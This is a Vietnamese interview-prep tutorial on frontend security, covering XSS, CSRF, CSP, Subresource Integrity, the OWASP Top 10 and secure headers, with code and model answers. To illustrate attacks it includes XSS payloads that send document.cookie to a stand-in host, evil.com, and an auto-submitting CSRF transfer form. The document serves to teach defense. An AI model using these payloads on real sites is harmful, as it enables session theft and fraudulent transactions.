---
sidebar_position: 5
title: "5. XSS, CSRF, CSP, Subresource Integrity, OWASP Top 10"
---

# XSS, CSRF, CSP, Subresource Integrity, OWASP Top 10

Security trong frontend thường bị xem nhẹ -- nhiều dev nghĩ "security là việc của backend". Nhưng thực tế, **phần lớn attack vectors bắt đầu từ frontend**: XSS qua input không sanitize, CSRF qua form submission, credential theft qua phishing UI... Bài này cover những câu hỏi phỏng vấn security mà Senior frontend developer phải biết.

---

## Mục lục

- [Câu 1: XSS là gì? Có bao nhiêu loại? Phòng chống như thế nào? `[Senior]`](#câu-1-xss-là-gì-có-bao-nhiêu-loại-phòng-chống-như-thế-nào-senior)
- [Câu 2: CSRF là gì? SameSite cookies giải quyết như thế nào? `[Intermediate]`](#câu-2-csrf-là-gì-samesite-cookies-giải-quyết-như-thế-nào-intermediate)
- [Câu 3: Content Security Policy (CSP) là gì? `[Senior]`](#câu-3-content-security-policy-csp-là-gì-senior)
- [Câu 4: Subresource Integrity (SRI) là gì? `[Intermediate]`](#câu-4-subresource-integrity-sri-là-gì-intermediate)
- [Câu 5: OWASP Top 10 cho frontend -- những risks nào liên quan? `[Senior]`](#câu-5-owasp-top-10-cho-frontend-những-risks-nào-liên-quan-senior)
- [Câu 6: Secure headers và input sanitization? `[Intermediate]`](#câu-6-secure-headers-và-input-sanitization-intermediate)
- [Lỗi thường gặp khi trả lời](#lỗi-thường-gặp-khi-trả-lời)

---

## Câu 1: XSS là gì? Có bao nhiêu loại? Phòng chống như thế nào? `[Senior]`

### Giải thích lý thuyết

**XSS (Cross-Site Scripting)** là kiểu tấn công inject mã JavaScript độc hại vào website, khiến browser của victim thực thi code đó. Hậu quả: đánh cắp cookies/session, redirect đến phishing site, keylogging, defacement...

**3 loại XSS:**

1. **Reflected XSS**: Payload nằm trong URL/request, server reflect lại trong response. Victim click link chứa payload.

2. **Stored XSS**: Payload được lưu vào database (qua form, comment...), mọi user truy cập page đều bị execute. Nguy hiểm nhất.

3. **DOM-based XSS**: Payload không qua server, JavaScript client-side tự đọc từ URL/DOM và inject vào page. Ví dụ: `document.innerHTML = location.hash`.

### Code ví dụ

**Reflected XSS:**

```
URL: https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

// Server trả về:
<p>Search results for: <script>document.location=...</script></p>
// Browser execute script → cookie bị gửi đến evil.com
```

**Stored XSS:**

```
// User submit comment chứa script
Comment: "Great article! <script>fetch('https://evil.com/steal', {method:'POST', body:document.cookie})</script>"

// Comment được lưu vào DB, mọi user đọc bài đều bị execute
```

**DOM-based XSS:**

```javascript
// Vulnerable code
const name = new URLSearchParams(location.search).get("name");
document.getElementById("greeting").innerHTML = `Hello, ${name}!`;

// Attack URL:
// https://example.com?name=<img src=x onerror="alert(document.cookie)">
```

**Phòng chống XSS trong React:**

```typescript
// React tự động escape HTML trong JSX -- AN TOÀN
function UserGreeting({ name }: { name: string }) {
  // React escapes: <script> thành &lt;script&gt;
  return <p>Hello, {name}!</p>;
}

// NGUY HIỂM: dangerouslySetInnerHTML bypass escaping
function RichContent({ html }: { html: string }) {
  // BAD: Inject raw HTML từ user input
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// GOOD: Sanitize trước khi render
import DOMPurify from 'dompurify';

function SafeRichContent({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Phòng chống DOM XSS:**

```typescript
// BAD: Dùng innerHTML
const userInput = getSearchParam("q");
element.innerHTML = userInput; // XSS!

// GOOD: Dùng textContent (không parse HTML)
element.textContent = userInput; // Safe -- chỉ hiển thị text

// BAD: eval() và tương đương
eval(userInput); // XSS!
new Function(userInput)(); // XSS!
setTimeout(userInput, 100); // XSS nếu userInput là string!

// GOOD: Không bao giờ eval user input
// Nếu cần dynamic behavior, dùng predefined mapping
const actions: Record<string, () => void> = {
  "sort-name": () => sortByName(),
  "sort-date": () => sortByDate(),
};
const action = actions[userInput];
if (action) action();
```

### Đáp án mẫu

> "XSS có 3 loại: Reflected (payload trong URL, server reflect), Stored (payload lưu DB, affect mọi user -- nguy hiểm nhất), và DOM-based (client-side JavaScript tự inject). React tự escape JSX nên XSS khó hơn, nhưng vẫn có risks: dangerouslySetInnerHTML, href='javascript:...', và server-rendered HTML. Phòng chống: dùng textContent thay innerHTML, sanitize HTML với DOMPurify khi cần render rich content, không bao giờ eval() user input, và dùng CSP header để giới hạn script sources."

---

## Câu 2: CSRF là gì? SameSite cookies giải quyết như thế nào? `[Intermediate]`

### Giải thích lý thuyết

**CSRF (Cross-Site Request Forgery)** là kiểu tấn công khiến browser của victim gửi request đến website mà victim đã đăng nhập, **mà victim không biết**. Browser tự gắn cookies vào request, nên server nghĩ đó là request hợp lệ.

**Kịch bản:**

1. User đăng nhập vào `bank.com` (browser lưu session cookie)
2. User truy cập `evil.com` (trong tab khác)
3. `evil.com` có hidden form submit đến `bank.com/transfer?to=attacker&amount=10000`
4. Browser gửi request kèm session cookie → server xử lý transfer

### Code ví dụ

**CSRF attack:**

```html
<!-- evil.com có form ẩn -->
<form action="https://bank.com/api/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById("csrf-form").submit();
</script>
```

**Phòng chống bằng CSRF Token:**

```typescript
// Backend gửi CSRF token qua cookie hoặc response
// Frontend gắn token vào header mỗi request

// Lấy CSRF token từ meta tag (server render)
function getCsrfToken(): string {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta?.getAttribute("content") || "";
}

// Gắn vào mọi request
async function apiRequest(url: string, options: RequestInit = {}) {
  const csrfToken = getCsrfToken();

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken,
    },
    credentials: "same-origin", // Gửi cookies cho same-origin requests
  });
}
```

**SameSite cookie attribute:**

```
// Server set cookie với SameSite attribute
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly

// SameSite values:
// Strict: Cookie KHÔNG gửi cho cross-site requests (kể cả click link)
// Lax:    Cookie gửi cho top-level navigations (click link) nhưng KHÔNG gửi cho form POST, iframe, AJAX
// None:   Cookie gửi cho mọi cross-site requests (cần Secure flag)
```

```typescript
// Express.js cookie config
app.use(
  session({
    cookie: {
      httpOnly: true, // JavaScript không đọc được cookie
      secure: true, // Chỉ gửi qua HTTPS
      sameSite: "lax", // Chống CSRF
      maxAge: 24 * 60 * 60 * 1000, // 1 day
    },
  }),
);
```

### Bảng so sánh SameSite values

| Value      | Cross-site POST | Cross-site GET (link) | Cross-site iframe | CSRF Protection        |
| ---------- | --------------- | --------------------- | ----------------- | ---------------------- |
| **Strict** | Blocked         | Blocked               | Blocked           | Mạnh nhất              |
| **Lax**    | Blocked         | Allowed               | Blocked           | Tốt (default hiện tại) |
| **None**   | Allowed         | Allowed               | Allowed           | Không có               |

### Đáp án mẫu

> "CSRF exploit việc browser tự gắn cookies vào cross-origin requests. Phòng chống có 3 layers: (1) SameSite=Lax cookies (default trên Chrome từ 2020) ngăn cookie gửi kèm cross-site POST requests, (2) CSRF tokens -- server generate unique token, client gắn vào header mỗi request, server verify, (3) Check Origin/Referer header trên server. Với SPA dùng JWT trong header thay cookies, CSRF không phải vấn đề vì attacker không đọc được token từ cross-origin."

---

## Câu 3: Content Security Policy (CSP) là gì? `[Senior]`

### Giải thích lý thuyết

**CSP (Content Security Policy)** là HTTP header cho phép bạn **whitelist** nguồn tài nguyên mà browser được phép load. Nếu script/style/image đến từ nguồn không được whitelist, browser block nó.

CSP là **defense-in-depth** chống XSS -- ngay cả khi attacker inject được script tag, nếu script source không nằm trong CSP whitelist, browser sẽ không execute.

### Code ví dụ

**CSP header:**

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123' https://cdn.example.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  img-src 'self' data: https://images.example.com;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

**Giải thích từng directive:**

```
default-src 'self'          → Mặc định chỉ load từ same origin
script-src 'self' 'nonce-X' → Scripts: same origin + scripts có nonce attribute
style-src 'self'            → Styles: same origin
img-src 'self' data:        → Images: same origin + data URIs (inline SVG)
connect-src 'self' api.com  → XHR/fetch: same origin + api.example.com
frame-src 'none'            → Không cho phép iframe
object-src 'none'           → Không cho phép Flash/plugins
```

**CSP với nonce (recommended cho inline scripts):**

```typescript
// Server generate unique nonce mỗi request
import crypto from "crypto";

function generateNonce(): string {
  return crypto.randomBytes(16).toString("base64");
}

// Middleware
app.use((req, res, next) => {
  const nonce = generateNonce();
  res.locals.nonce = nonce;

  res.setHeader(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'unsafe-inline'`,
  );

  next();
});
```

```html
<!-- Chỉ script có đúng nonce mới được execute -->
<script nonce="abc123">
  // Script này được phép chạy
  console.log("Legitimate script");
</script>

<script>
  // Script này bị block vì không có nonce
  console.log("Blocked by CSP");
</script>

<!-- Injected script cũng bị block -->
<script>
  alert("XSS");
</script>
<!-- Blocked! -->
```

**CSP report-only mode (test trước khi enforce):**

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  script-src 'self';
  report-uri /api/csp-reports;
```

```typescript
// Endpoint nhận CSP violation reports
app.post("/api/csp-reports", (req, res) => {
  const report = req.body["csp-report"];
  console.log("CSP violation:", {
    blockedUri: report["blocked-uri"],
    violatedDirective: report["violated-directive"],
    documentUri: report["document-uri"],
  });
  res.status(204).end();
});
```

### Đáp án mẫu

> "CSP là HTTP header whitelist nguồn tài nguyên được phép load -- script, style, image, font, API endpoints. Nó là defense-in-depth chống XSS: ngay cả khi attacker inject script tag, nếu source không trong whitelist, browser block nó. Best practice: dùng nonce cho inline scripts (không dùng 'unsafe-inline'), restrict frame-src và object-src to 'none', và bắt đầu với report-only mode để phát hiện violations trước khi enforce. CSP phức tạp với SPA frameworks vì chúng thường generate inline scripts."

---

## Câu 4: Subresource Integrity (SRI) là gì? `[Intermediate]`

### Giải thích lý thuyết

**SRI (Subresource Integrity)** cho phép browser verify rằng file tải từ CDN **không bị tamper**. Browser so sánh hash của file downloaded với hash khai báo trong HTML -- nếu khác nhau, browser block file.

**Tại sao cần SRI?** Nếu CDN bị compromise, attacker có thể modify jQuery/React file, inject malicious code. Mọi website dùng CDN đó đều bị ảnh hưởng (supply chain attack).

### Code ví dụ

```html
<!-- Không có SRI -- nếu CDN bị hack, file bị modify → XSS -->
<script src="https://cdn.example.com/react.production.min.js"></script>

<!-- Có SRI -- browser verify hash trước khi execute -->
<script
  src="https://cdn.example.com/react.production.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>

<!-- Nếu file bị modify, hash không khớp → browser block -->
```

**Generate SRI hash:**

```bash
# Tạo hash cho file
openssl dgst -sha384 -binary react.production.min.js | openssl base64 -A

# Hoặc dùng shasum
shasum -b -a 384 react.production.min.js | awk '{ print $1 }' | xxd -r -p | base64
```

**Tự động generate SRI trong build:**

```typescript
// webpack.config.js
const SriPlugin = require("webpack-subresource-integrity");

module.exports = {
  output: {
    crossOriginLoading: "anonymous",
  },
  plugins: [
    new SriPlugin({
      hashFuncNames: ["sha384"],
      enabled: process.env.NODE_ENV === "production",
    }),
  ],
};
```

**SRI cho CSS:**

```html
<link
  rel="stylesheet"
  href="https://cdn.example.com/tailwind.min.css"
  integrity="sha384-..."
  crossorigin="anonymous"
/>
```

### Đáp án mẫu

> "SRI cho phép browser verify integrity của files tải từ CDN bằng cryptographic hash. Nếu CDN bị compromise và file bị modify, hash không khớp và browser block file. Rất quan trọng cho supply chain security -- 1 CDN bị hack có thể affect hàng triệu websites. Tôi generate SRI hashes trong build pipeline (webpack-subresource-integrity plugin) và luôn dùng crossorigin='anonymous' attribute kèm theo."

---

## Câu 5: OWASP Top 10 cho frontend -- những risks nào liên quan? `[Senior]`

### Giải thích lý thuyết

**OWASP Top 10** là danh sách 10 rủi ro bảo mật web phổ biến nhất. Dù chủ yếu target full-stack, frontend developer cần quan tâm nhiều items:

### Bảng OWASP Top 10 liên quan đến Frontend

| #       | Risk                           | Frontend Relevance | Phòng chống                           |
| ------- | ------------------------------ | ------------------ | ------------------------------------- |
| **A03** | Injection (XSS)                | **Cao**            | Escape output, sanitize input, CSP    |
| **A05** | Security Misconfiguration      | **Cao**            | CSP, secure headers, no debug in prod |
| **A07** | Identification & Auth Failures | **Cao**            | Secure token storage, logout          |
| **A08** | Software & Data Integrity      | **Trung bình**     | SRI, dependency audit                 |
| **A09** | Security Logging & Monitoring  | **Trung bình**     | Client-side error tracking            |
| **A01** | Broken Access Control          | **Trung bình**     | Route guards (but enforce on server)  |
| **A02** | Cryptographic Failures         | **Thấp**           | HTTPS only, no secrets in client      |
| **A04** | Insecure Design                | **Thấp**           | Threat modeling                       |
| **A06** | Vulnerable Components          | **Cao**            | npm audit, Snyk, Dependabot           |
| **A10** | SSRF                           | **Thấp**           | Validate URLs on server               |

### Code ví dụ

**A07 -- Secure token storage:**

```typescript
// BAD: Store JWT trong localStorage (XSS có thể đọc)
localStorage.setItem("token", jwt);

// BAD: Store JWT trong regular cookie (CSRF risk)
document.cookie = `token=${jwt}`;

// GOOD: HTTP-only cookie (JavaScript không đọc được)
// Server set:
// Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Lax; Path=/

// GOOD: Nếu phải dùng client-side, dùng in-memory + refresh token
class AuthStore {
  private accessToken: string | null = null;

  setToken(token: string) {
    this.accessToken = token;
    // Không lưu vào localStorage
    // Refresh token trong HTTP-only cookie
  }

  getToken(): string | null {
    return this.accessToken;
  }

  clearToken() {
    this.accessToken = null;
  }
}
```

**A06 -- Dependency vulnerability scanning:**

```bash
# Built-in npm audit
npm audit
npm audit fix

# Automated với GitHub Dependabot (.github/dependabot.yml)
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
```

```json
{
  "scripts": {
    "security:audit": "npm audit --production",
    "security:check": "npx better-npm-audit audit --level moderate"
  }
}
```

**A01 -- Client-side route protection (nhưng enforce trên server):**

```typescript
// Frontend route guard -- UX only, NOT security
function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { user, loading } = useAuth();

  if (loading) return <Spinner />;

  if (!user) {
    return <Navigate to="/login" replace />;
  }

  // Role-based access (UX only)
  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }

  return children;
}

// QUAN TRỌNG: Server PHẢI verify permissions cho mọi API call
// Frontend route guard chỉ là UX, attacker bypass dễ dàng
// Server: middleware kiểm tra JWT + role cho mỗi endpoint
```

### Đáp án mẫu

> "Frontend liên quan trực tiếp đến nhiều OWASP risks: A03 Injection (XSS -- sanitize, CSP), A05 Misconfiguration (security headers, debug mode), A06 Vulnerable Components (npm audit, Dependabot), A07 Auth Failures (secure token storage, HTTP-only cookies). Nguyên tắc quan trọng nhất: frontend security là UX layer, không phải security layer. Mọi authorization phải enforce trên server -- route guards chỉ là UX improvement, attacker bypass bằng direct API calls."

---

## Câu 6: Secure headers và input sanitization? `[Intermediate]`

### Giải thích lý thuyết

**Security headers** là HTTP response headers yêu cầu browser bật các tính năng bảo mật. Nhiều headers chỉ cần set 1 lần trên server/CDN và bảo vệ toàn bộ site.

### Code ví dụ

**Essential security headers:**

```typescript
// Express.js middleware (hoặc Next.js headers config)
app.use((req, res, next) => {
  // Chống XSS: CSP
  res.setHeader("Content-Security-Policy", "default-src 'self'");

  // Chống clickjacking: không cho phép iframe
  res.setHeader("X-Frame-Options", "DENY");

  // Không cho browser sniff MIME type
  res.setHeader("X-Content-Type-Options", "nosniff");

  // Chống thông tin về server
  res.removeHeader("X-Powered-By");

  // HTTPS only
  res.setHeader(
    "Strict-Transport-Security",
    "max-age=63072000; includeSubDomains; preload",
  );

  // Kiểm soát thông tin gửi trong Referer header
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

  // Kiểm soát browser features
  res.setHeader(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()",
  );

  next();
});
```

**Next.js security headers:**

```javascript
// next.config.js
const securityHeaders = [
  {
    key: "X-DNS-Prefetch-Control",
    value: "on",
  },
  {
    key: "Strict-Transport-Security",
    value: "max-age=63072000; includeSubDomains; preload",
  },
  {
    key: "X-Frame-Options",
    value: "SAMEORIGIN",
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    key: "Permissions-Policy",
    value: "camera=(), microphone=(), geolocation=()",
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: securityHeaders,
      },
    ];
  },
};
```

**Input sanitization:**

```typescript
// Sanitize HTML input (cho rich text editor)
import DOMPurify from 'dompurify';

function sanitizeUserInput(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'h2', 'h3'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['rel'],       // Add rel="noopener" to links
    FORBID_TAGS: ['script', 'style', 'iframe', 'form', 'input'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'style'],
  });
}

// Sanitize URL (chống javascript: protocol)
function sanitizeUrl(url: string): string {
  try {
    const parsed = new URL(url);
    // Chỉ cho phép http và https
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return '#';
    }
    return parsed.href;
  } catch {
    return '#';
  }
}

// Usage
function UserComment({ comment }: { comment: { html: string; authorUrl: string } }) {
  const safeHtml = sanitizeUserInput(comment.html);
  const safeUrl = sanitizeUrl(comment.authorUrl);

  return (
    <div>
      <a href={safeUrl} target="_blank" rel="noopener noreferrer">
        Author profile
      </a>
      <div dangerouslySetInnerHTML={{ __html: safeHtml }} />
    </div>
  );
}
```

**Validate và sanitize form input:**

```typescript
import { z } from "zod";

// Schema validation -- reject invalid input early
const commentSchema = z.object({
  // Giới hạn length để chống DoS
  text: z
    .string()
    .min(1, "Comment cannot be empty")
    .max(5000, "Comment too long")
    .transform((val) => val.trim()),

  // Email validation
  email: z.string().email("Invalid email").toLowerCase(),

  // URL validation
  website: z
    .string()
    .url("Invalid URL")
    .refine((url) => url.startsWith("https://"), "Only HTTPS URLs allowed")
    .optional(),
});

function handleCommentSubmit(formData: unknown) {
  const result = commentSchema.safeParse(formData);

  if (!result.success) {
    // Show validation errors to user
    const errors = result.error.flatten().fieldErrors;
    return { errors };
  }

  // Safe to use result.data
  return submitComment(result.data);
}
```

### Bảng so sánh các loại tấn công và cách phòng chống

| Attack                       | Mô tả                                     | Phòng chống Frontend                     | Phòng chống Backend                   |
| ---------------------------- | ----------------------------------------- | ---------------------------------------- | ------------------------------------- |
| **Reflected XSS**            | Payload trong URL, server reflect         | CSP, escape output                       | Validate input, encode output         |
| **Stored XSS**               | Payload lưu DB, serve cho mọi user        | CSP, DOMPurify cho rich content          | Sanitize on input AND output          |
| **DOM XSS**                  | Client JS inject payload vào DOM          | textContent thay innerHTML, sanitize URL | N/A (client-side only)                |
| **CSRF**                     | Trick browser gửi authenticated request   | SameSite cookies                         | CSRF tokens, check Origin header      |
| **Clickjacking**             | Overlay invisible iframe lên UI           | X-Frame-Options header                   | X-Frame-Options / CSP frame-ancestors |
| **Supply chain**             | Compromised npm package hoặc CDN          | SRI, npm audit, lockfile                 | Dependabot, Snyk                      |
| **Open redirect**            | Redirect user đến malicious site          | Validate redirect URLs                   | Whitelist allowed domains             |
| **Sensitive data exposure**  | Secrets trong source code / localStorage  | Không store secrets client-side          | HTTP-only cookies, env vars           |
| **Insecure deserialization** | Malicious JSON/data from untrusted source | Validate schema (Zod)                    | Input validation, type checking       |

### Đáp án mẫu

> "Security headers là low-hanging fruit -- set 1 lần, protect cả site. Must-have: CSP (chống XSS), X-Frame-Options (chống clickjacking), Strict-Transport-Security (force HTTPS), X-Content-Type-Options (chống MIME sniffing), Permissions-Policy (restrict browser APIs). Cho input sanitization, tôi dùng Zod validate schema trước (reject invalid early), DOMPurify sanitize HTML khi cần render rich content, và custom sanitizeUrl() chống javascript: protocol. Nguyên tắc: validate input, encode output, và never trust client-side data."

---

## Lỗi thường gặp khi trả lời

1. **Nói "React tự chống XSS nên không cần lo".** React escape JSX, nhưng `dangerouslySetInnerHTML`, `href="javascript:..."`, và server-side rendering vẫn vulnerable. CSP là layer bảo vệ cần thiết.

2. **Nhầm authentication với authorization.** Authentication = xác minh bạn là ai. Authorization = xác minh bạn có quyền làm gì. Frontend chỉ handle UX (route guards), server enforce authorization.

3. **Store JWT trong localStorage và nói "an toàn".** localStorage accessible bởi bất kỳ JavaScript nào trên page -- nếu có XSS, token bị đánh cắp. HTTP-only cookies an toàn hơn vì JavaScript không đọc được.

4. **Quên SameSite cookies.** Nhiều dev vẫn implement CSRF tokens phức tạp mà không biết SameSite=Lax (default trên modern browsers) đã giải quyết phần lớn CSRF attacks.

5. **Không nhắc đến supply chain security.** npm ecosystem có hàng ngàn packages, mỗi package có dependencies. Một compromised package ảnh hưởng toàn bộ chain. `npm audit`, lockfile integrity, và Dependabot là bắt buộc.

6. **Nói "security là việc của backend".** Frontend là attack surface đầu tiên. XSS, clickjacking, open redirect, sensitive data exposure đều bắt đầu từ frontend code. Defense-in-depth cần cả hai layers.
